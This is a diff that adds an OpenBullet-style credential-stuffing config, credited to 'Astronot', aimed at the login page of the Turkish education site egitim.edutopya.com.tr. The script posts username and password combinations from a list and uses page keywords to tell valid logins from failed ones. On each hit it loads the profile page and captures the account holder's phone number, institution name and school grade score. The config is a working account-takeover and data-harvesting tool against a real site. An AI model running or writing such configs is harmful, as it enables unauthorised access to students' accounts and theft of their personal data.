@@ -1,0 +1,79 @@
+[SETTINGS]
+{
+  "Name": "[CT] edutopya.com.tr [WEB]",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-24T14:39:29.6107531+03:00",
+  "AdditionalInfo": "",
+  "Author": "Astronot",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+REQUEST POST "https://egitim.edutopya.com.tr/Kullanici/Giris?ReturnUrl=%2f" 
+  CONTENT "Eposta=<US>&Sifre=<PASS>&ReturnUrl=%2F" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Kullanıcı adına göre kayıtlı kişi bulunamamıştır." 
+  KEYCHAIN Success OR 
+    KEY "Çıkış Yap" 
+
+REQUEST GET "https://egitim.edutopya.com.tr/profil/info" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "type=\"text\" name=\"Telefon\" id=\"Telefon\" value=\"" "\"" CreateEmpty=FALSE -> CAP "Telefon" 
+
+PARSE "<SOURCE>" LR "type=\"text\" name=\"KurumAdi\" id=\"KurumAdi\" value=\"" "\"" CreateEmpty=FALSE -> CAP "Kurum Adı" 
+
+PARSE "<SOURCE>" LR "type=\"text\" name=\"OBP\" id=\"OBP\" value=\"" "\"" CreateEmpty=FALSE -> CAP "Orta Öğretim Başarı" 
+
